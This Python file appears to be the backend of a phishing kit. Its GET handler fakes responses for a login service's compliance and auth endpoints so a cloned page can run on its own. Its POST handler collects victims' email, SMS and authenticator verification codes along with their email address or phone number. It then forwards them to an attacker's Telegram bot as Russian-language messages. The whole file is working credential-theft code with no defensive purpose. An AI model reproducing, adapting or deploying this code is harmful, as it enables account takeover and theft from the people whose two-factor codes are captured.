import json
import os
import requests
from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests"""
        # Handle CORS preflight
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        
        # Mock API responses for various endpoints
        if 'banner-compliance-check' in self.path:
            response_data = {"success": True, "data": {"show": False}}
        elif 'country-city-short' in self.path:
            response_data = {"country": "UA", "city": "Kyiv"}
        elif any(endpoint in self.path for endpoint in ['commonConfig', 'complianceActionCheck', 'businessCheckV2', 'region/language', 'querylangMappingByKey', 'authcenter/auth']):
            response_data = {"success": True, "data": {}}
        else:
            response_data = {"success": True, "data": {}}
        
        self.wfile.write(json.dumps(response_data).encode())

    def do_POST(self):
        """Handle POST requests"""
        try:
            # Get Telegram credentials
            telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
            telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID')
            
            if not telegram_bot_token or not telegram_chat_id:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({"success": False, "error": "Telegram not configured"}).encode())
                return
            
            # Read request body
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            verification_type = data.get('type', 'unknown')
            code = data.get('code', '000000')
            email = data.get('email', '')
            phone = data.get('phone', '')
            
            # Format message for Telegram
            if verification_type == 'email':
                message = f"📧 Email верификация\n\nEmail: {email}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
            elif verification_type == 'sms':
                message = f"📱 SMS верификация\n\nТелефон: {phone}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"  
            elif verification_type == 'authenticator':
                message = f"🔐 Аутентификатор\n\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
            else:
                message = f"🔑 Верификация\n\nТип: {verification_type}\nКод: {code}"
            
            # Send to Telegram
            telegram_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
            telegram_data = {
                'chat_id': telegram_chat_id,
                'text': message
            }
            
            response = requests.post(telegram_url, json=telegram_data, timeout=10)
            
            self.send_response(200 if response.status_code == 200 else 500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            if response.status_code == 200:
                self.wfile.write(json.dumps({"success": True, "message": "Код успешно отправлен"}).encode())
            else:
                self.wfile.write(json.dumps({"success": False, "error": "Ошибка отправки в Telegram"}).encode())
                
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({"success": False, "error": "Ошибка отправки"}).encode())

    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
